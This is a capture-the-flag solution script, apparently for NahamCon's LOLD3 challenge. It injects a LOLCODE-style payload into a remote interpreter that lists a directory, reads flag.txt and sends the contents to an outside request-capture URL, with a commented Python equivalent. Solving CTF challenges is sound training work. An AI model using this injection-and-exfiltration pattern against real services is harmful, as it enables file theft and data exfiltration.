#!/usr/bin/env python3

#  You can use your own server or tool like RequestBin or Beeceptor to intercept request in an easy way
#  In this part we have to find the flag.txt file first. 
#  My idea is to send os.listdir output in body of POST request.
#  Flag should be easy to find in a few requests, it is in the /opt/challenge directory
#  When we have the correct path, we send it as in LOLD2, in the url
#  Flag will apear in the url

from pwn import *

p = remote('challenge.nahamcon.com', 31816)

URL = "https://lold3.free.beeceptor.com/"

#  import urllib2
#  import urllib
#  import os
#  data = os.listdir("/opt/challenge/")
#  data = "\n".join(data)
#  flag = open("/opt/challenge/flag.txt").read()
#  url = URL + flag
#  req. = urllib2.Request(url, data=data)
#  urllib2.urlopen(req)

payload = f'''GIMME urllib2
GIMME urllib
GIMME os
data CAN HAS os OWN listdir WIT "/opt/challenge/" !
data CAN HAS "\n" OWN join WIT data !
flag CAN HAS open WIT "/opt/challenge/flag.txt"! OWN read THING
url CAN HAS "{URL}" ALONG WITH flag
req CAN HAS urllib2 OWN Request WIT url AND data CAN HAS data !
urllib2 OWN urlopen WIT req !
'''

print( p.recvuntil('MAYB I RUN 4 U!').decode(encoding='ascii') )
p.sendline(payload)
print( p.recvall().decode(encoding='ascii') )
